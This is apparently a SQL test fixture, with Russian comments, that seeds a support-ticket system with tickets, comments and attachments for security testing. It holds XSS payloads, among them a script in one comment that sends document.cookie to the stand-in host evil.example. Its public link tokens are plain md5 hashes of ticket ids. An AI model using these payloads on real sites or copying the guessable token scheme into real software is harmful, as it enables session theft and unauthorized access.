-- Тестовые данные. Контакты 1 и 2 — клиенты. Токены публичных ссылок: md5 от id обращения.

INSERT INTO support_ticket (id, contact_id, contact_email, subject, body, status, public_token, internal_note, create_datetime) VALUES
(1, 1, 'client1@example.com', 'Не открывается тренинг', 'После оплаты доступа нет.\nПомогите, пожалуйста.', 'open', 'c4ca4238a0b923820dcc509a6f75849b', 'Оплата проверена, доступ выдан вручную', NOW()),
(2, 2, 'client2@example.com', '<img src=x onerror="alert(document.cookie)">', 'Хочу вернуть деньги.', 'new', 'c81e728d9d4c2f636f067f89cc14862c', 'Клиент грубил, возврат не обещать', NOW()),
(3, 2, 'client2@example.com', 'Вопрос по сертификату', 'Когда придёт сертификат?', 'closed', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '', DATE_SUB(NOW(), INTERVAL 10 DAY)),
(4, 1, 'client1@example.com', 'Смена почты', 'Хочу сменить почту в профиле.', 'new', 'a87ff679a2f3e71d9181a67b7542122c', '', NOW());

INSERT INTO support_comment (id, ticket_id, contact_id, is_staff, body, create_datetime) VALUES
(1, 1, 100, 1, 'Здравствуйте! Проверяем оплату.', NOW()),
(2, 2, 2, 0, '<script>new Image().src="http://evil.example/?c="+document.cookie</script>', NOW());

INSERT INTO support_attachment (id, ticket_id, name, path, size, create_datetime) VALUES
(1, 1, 'screenshot.png', '/var/www/wa-data/public/support/attachments/screenshot.png', 20480, NOW()),
(2, 2, 'payment.pdf', '/var/www/wa-data/public/support/attachments/payment.pdf', 51200, NOW());
